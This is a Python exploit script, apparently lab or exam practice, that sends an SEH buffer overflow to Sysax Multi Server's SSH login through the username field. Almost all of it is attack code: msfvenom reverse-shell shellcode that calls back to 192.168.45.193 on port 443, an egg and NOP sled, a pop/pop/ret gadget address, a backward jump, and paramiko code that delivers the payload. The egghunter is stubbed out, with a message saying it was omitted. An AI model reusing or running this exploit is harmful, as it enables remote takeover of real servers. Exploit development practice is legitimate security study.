#!/usr/bin/python3

from struct import pack
import paramiko
import pwn
import socket
import sys


# same as exploit.py, but refactored in a different programming style to make
# structure of the final payload a bit more immediately explicit


# Sysax Multi Server control panel -> Manage Server Settings -> Connection Protocols -> SSH2 based Secure Shell and SFTP/SCP on port 22
# Then Start Server; then attach WinDBG to sysaxservd.exe
# Restart program in GUI with Stop Server, then Start Server


def main() :
    server = sys.argv[1]
    payload = buildPayload()
    sendPayload(server, payload)


# 0:008> !nmod
# 00400000 005e5000 sysaxservd           /SafeSEH OFF                C:\Program Files\SysaxServer\sysaxservd.exe

def buildPayload():
    payloadSize = 0x8000
    badchars    = b"\x00\x3a"
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    # buf += pwn.cyclic(payloadSize)
    offBufSeh = 9216                                            # pwn.cyclic_find(0x616a6f64)
    backJump  = 0x70                                            # from overwritten SEH

    buf  = b""
    buf += egg()
    buf += nopsled()
    buf += shellcode()
    buf += b"A" * (offBufSeh - len(buf) - 4 - backJump)         # padding to align SEH PPR
    tmpLen1 = len(buf)
    buf += nopsled()
    buf += egghunter()
    buf += b"\x90" * (backJump - (len(buf) - tmpLen1))          # padding egghunter to length of / to fill backJump

    # buf += b"\xcc\x90\x90\x90"
    buf += b"\xeb" + bytes([0xff+1-backJump]) + b"\x90\x90"     # jump backwards to egghunter: = pwn.asm(f"jmp $ - {backJump} ; nop ; nop")

    # note: very last byte of PPR ROP gadget address (null-byte) is a bad char and terminates payload
    # that is allowed => we place check for bad characters here before that address
    for b in badchars:
        assert b not in buf, print(f"Error: badchar {hex(b)} ('{chr(b)}') appeared in payload", "\n\n", pwn.hexdump(buf))

    buf += pack("<I", 0x00559f4b)                               # SEH pop/pop/ret
                                                                # bp /w "*((*((unsigned short**)(@esp+8)))+1) == 0x9090" 0x00559f4b ; g

    buf += b"Z" * (payloadSize - len(buf))                      # padding to fixate payloadSize

    assert len(buf) == payloadSize, "Mismatching size: f{len(buf)} != f{payloadSize}"

    return buf


def egg():
    return b"w00tw00t"

def nopsled(length=0x10):
    return b"\x90" * length

def shellcode():
    buf  = b""
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.193 LPORT=443 -f python -v buf -b "\x00\x3a"
    # nc -vlnp 443
    buf += b"\xb8\x06\x1a\xe6\xf7\xd9\xea\xd9\x74\x24\xf4\x5d"
    buf += b"\x33\xc9\xb1\x52\x31\x45\x12\x03\x45\x12\x83\xc3"
    buf += b"\x1e\x04\x02\x37\xf6\x4a\xed\xc7\x07\x2b\x67\x22"
    buf += b"\x36\x6b\x13\x27\x69\x5b\x57\x65\x86\x10\x35\x9d"
    buf += b"\x1d\x54\x92\x92\x96\xd3\xc4\x9d\x27\x4f\x34\xbc"
    buf += b"\xab\x92\x69\x1e\x95\x5c\x7c\x5f\xd2\x81\x8d\x0d"
    buf += b"\x8b\xce\x20\xa1\xb8\x9b\xf8\x4a\xf2\x0a\x79\xaf"
    buf += b"\x43\x2c\xa8\x7e\xdf\x77\x6a\x81\x0c\x0c\x23\x99"
    buf += b"\x51\x29\xfd\x12\xa1\xc5\xfc\xf2\xfb\x26\x52\x3b"
    buf += b"\x34\xd5\xaa\x7c\xf3\x06\xd9\x74\x07\xba\xda\x43"
    buf += b"\x75\x60\x6e\x57\xdd\xe3\xc8\xb3\xdf\x20\x8e\x30"
    buf += b"\xd3\x8d\xc4\x1e\xf0\x10\x08\x15\x0c\x98\xaf\xf9"
    buf += b"\x84\xda\x8b\xdd\xcd\xb9\xb2\x44\xa8\x6c\xca\x96"
    buf += b"\x13\xd0\x6e\xdd\xbe\x05\x03\xbc\xd6\xea\x2e\x3e"
    buf += b"\x27\x65\x38\x4d\x15\x2a\x92\xd9\x15\xa3\x3c\x1e"
    buf += b"\x59\x9e\xf9\xb0\xa4\x21\xfa\x99\x62\x75\xaa\xb1"
    buf += b"\x43\xf6\x21\x41\x6b\x23\xe5\x11\xc3\x9c\x46\xc1"
    buf += b"\xa3\x4c\x2f\x0b\x2c\xb2\x4f\x34\xe6\xdb\xfa\xcf"
    buf += b"\x61\x24\x52\xe2\xb0\xcc\xa1\xfc\x33\xb6\x2f\x1a"
    buf += b"\x59\xd8\x79\xb5\xf6\x41\x20\x4d\x66\x8d\xfe\x28"
    buf += b"\xa8\x05\x0d\xcd\x67\xee\x78\xdd\x10\x1e\x37\xbf"
    buf += b"\xb7\x21\xed\xd7\x54\xb3\x6a\x27\x12\xa8\x24\x70"
    buf += b"\x73\x1e\x3d\x14\x69\x39\x97\x0a\x70\xdf\xd0\x8e"
    buf += b"\xaf\x1c\xde\x0f\x3d\x18\xc4\x1f\xfb\xa1\x40\x4b"
    buf += b"\x53\xf4\x1e\x25\x15\xae\xd0\x9f\xcf\x1d\xbb\x77"
    buf += b"\x89\x6d\x7c\x01\x96\xbb\x0a\xed\x27\x12\x4b\x12"
    buf += b"\x87\xf2\x5b\x6b\xf5\x62\xa3\xa6\xbd\x93\xee\xea"
    buf += b"\x94\x3b\xb7\x7f\xa5\x21\x48\xaa\xea\x5f\xcb\x5e"
    buf += b"\x93\x9b\xd3\x2b\x96\xe0\x53\xc0\xea\x79\x36\xe6"
    buf += b"\x59\x79\x13"
    return buf

def egghunter():
    buf  = b""
    # ./assemble.py egghunter-seh-win10.asm python
    print("[!] Egghunter omitted...") ; exit(1)
    return buf


def sendPayload(server, payload):
    print("[+] Sending payload")
    t = paramiko.Transport((server, 22))
    t.connect(username=payload, password="test")
    t.close()


if __name__ == "__main__":
    main()
